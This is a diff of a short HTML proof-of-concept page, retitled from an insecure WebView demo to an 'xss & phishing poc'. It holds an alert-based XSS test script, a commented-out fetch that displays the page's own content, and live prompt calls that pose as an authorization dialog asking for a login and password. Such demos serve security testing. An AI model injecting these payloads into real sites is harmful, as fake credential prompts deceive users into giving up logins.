@@ -3,19 +3,19 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Insecure WebView pOc</title>
+	<title>XSS pOc</title>
 </head>
 <body>
-	<h2>Insecure WebView by @D3sp0</h2>
+	<h2>xss & phishing poc by @D3sp0</h2>
 	
 </body>
 	<script>alert(/xss_poc/)</script>
-	<script>
-		javascript:fetch('/').then(res=>res.text()).then(data=>alert(data));
-	</script>
+	
+	
 	
 	<script>
 		   /* javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}*/
+		/* javascript:fetch('/').then(res=>res.text()).then(data=>alert(data));*/
 
 		    javascript:window.prompt('Authorization:Login','Input_Login');
 		    window.prompt('Authorization:Password','Input_Password');
